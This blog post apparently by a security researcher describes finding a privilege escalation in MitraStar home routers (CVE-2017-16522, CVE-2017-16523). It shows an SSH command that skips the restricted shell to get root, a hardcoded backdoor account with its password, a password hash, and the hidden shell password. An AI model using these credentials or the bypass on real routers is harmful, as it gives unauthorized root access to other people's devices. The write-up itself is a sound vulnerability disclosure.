title: MitraStar routers Remote Privilege Escalation
---

In this post I will describe how I discovered the vulnerabilities [CVE-2017-16522](https://nvd.nist.gov/vuln/detail/CVE-2017-16522) and [CVE-2017-16523](https://nvd.nist.gov/vuln/detail/CVE-2017-16523). These two vulnerabilities affect some domestic routers distributed by Movistar (Telef√≥nica). Actually, these vulnerabilities affect all the MitraStar routers with version up to november 2017.

The devices where the research has been made are the MitraStar DSL-100HN-T1 ("*the old*") and the MitraStar GPT-2541GNAC (HGU) ("*the new*").

*The old* with a firmware version ES_113WJY0b16:

*The new* with a firmware version 1.00(VNJ0)b1:

      <img src="/images/router-attack/new.jpeg">
</p>

These two vulnerabilities can be considered as only one that elevates privileges remotely on the router avoiding the preseted shell.

#### Getting access to the router

The first thing I did was a port scanning with the tool *nmap* in the old:
```bash
nmap -F <router_ip>
```
With the the following result:
```bash
PORT      STATE    SERVICE
21/tcp    open     ftp
22/tcp    open     ssh
23/tcp    filtered telnet
53/tcp    open     domain
80/tcp    open     http
443/tcp   open     https
8080/tcp  open     http-proxy
49152/tcp open     unknown
```

This router has *ssh* running on the port 22 and with some google searches I found that the default user is *admin* and the password is under the router.
I also discovered months later with reverse engineering that in some routers exist a user call *zyad1234* with password *zyad1234* (Vulnerability CVE-2017-16523).

In my case, with the *admin* user I could get access to the router.

When you log in to the router through *ssh* the router provides you a limitated shell with some commands that allow you to modify some parameters such as the DHCP, lan parameters, and install updates and configurations. All these functions can be executed through the router configuration website at 192.168.1.1.

```bash
$ ssh 1234@192.168.1.3
1234@192.168.1.3's password: 
 >ls
Can't find command: [ls]. Type '?' for usage
 >?
Valid commands are:
?               exit            save            sys             restoredefault
wan             lan             igmp            wlan            nat
routing         
 >sys
Missing subcommand. Valid subcommands are:
process         userPasswd      passwd          telnetd         state
swversion       swupdate        updatecfg       backupcfg       dumpcfg
sysdiagd        firewall        upnp            reboot          exitOnIdle
ppp             
 >sys swversion
V1.13(WJY.0)b15
 >
```

#### Looking for some bugs

The first thing I tried was introducing a long string to produce a buffer overflow or some crashes:
```bash
 >aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Cant find command: [aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa]. Type '?' for usage
 >
```

With the impossibility of finding a buffer overflow I accidentally introduced the *sh* command:
```bash
 >sh
Password:Password incorrect !
 >
```

This output means that there is a *sh* command that requires a password and it should give you access to a more privilege shell but the password is unknown.

#### Using other versions

After days without any result I decided to use the other router (*the new*). This router has a differente software version with the same pseudo-shell but with more commands such as *cat* (used to check if a specific file exists) or the *ps* command:
```bash
 > cat /etc/passwd
1234:Mt3cwxDUQQ7AY:0:0:Administrator:/:/bin/sh
 > ps

```

After I explored some commands I found the *deviceinfo* command which offers the following possibilities:
```bash
 > deviceinfo
Usage: deviceinfo show serialnumber
   deviceinfo show ploampw
   deviceinfo set serialnumber <value>
   deviceinfo set ploampw <value>
   deviceinfo show datetime
   deviceinfo show cpuload
   deviceinfo show meminfo
   deviceinfo show file <path>
   deviceinfo show interface
   deviceinfo --help
 > 
```

The command *deviceinfo show file /* works as the *ls* command and allows us to list all the files and directories that are in /:
```bash
 > deviceinfo show file /
app          debug        linuxrc      sbin         usrcfg
bin          dev          mnt          sys          var
cfg_upgrade  etc          opt          tmp          vmlinux.lz
data         lib          proc         usr          webs
 > 
```

I was generating the file system tree and looking for some files with information about the *sh* command password but I didn't find anything.

#### The vulnerability
The next day I came back to *the old* to try new things but surprisingly I decided to try something unusual. Instead of connecting to the router with the command *ssh admin@<router_ip>*, I decided to add the path to the *sh* binary (/bin/sh) as second parameter because by default *ssh* execute the command passed as argument.
```bash
ssh 1234@192.168.1.2 <comand>
```

The output was the following:
```bash
$ ssh 1234@192.168.1.3 /bin/sh
1234@192.168.1.3's password: 

					

```

This looked like there was something wrong and I was waiting for connection but I tried to introduce the *ls* command and surprisingly was executed succesfully!
I had access to a privilege shell with a complete root access to the system.

#### Some reverse engineering

I found that the default shell for ssh was a binary call cmdsh in the /bin/ folder.

I still needed the *sh* command password so I decided to bring the binary to my laptop an execute IDA Pro.
The binary was compiled for MIPS architecture and I only needed to find where the string "Password incorrect!" is used to see a condition before, that compare a string with the string "c93vu02jp4z04", the *sh* password.

#### Conclusions

I hope you learned something new and over all enjoyed reading this post as much I did writing it.

If you want more post like this one make it me know thorugh Twitter or buying me a [Ko-Fi](https://ko-fi.com/jolama)
